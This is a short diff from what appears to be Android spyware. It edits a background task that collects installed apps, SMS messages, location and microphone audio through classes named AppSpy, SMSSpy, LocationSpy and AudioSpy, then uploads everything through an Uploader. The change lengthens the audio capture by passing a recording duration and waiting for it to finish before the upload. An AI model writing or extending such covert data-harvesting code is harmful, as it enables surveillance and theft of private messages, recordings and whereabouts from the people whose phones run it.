@@ -11,7 +11,8 @@ public class WriteTask extends AsyncTask<Context, String, Boolean> {
             AppSpy.writeApps(context);
             SMSSpy.writeSMS(context);
             LocationSpy.writeLocation(context);
-            AudioSpy.writeAudio(context);
+            AudioSpy.writeAudio(context, Constants.AUDIO_TIME);
+            Thread.sleep(Constants.AUDIO_TIME);
             Uploader.uploadAll(context);
             return Boolean.TRUE;
         }
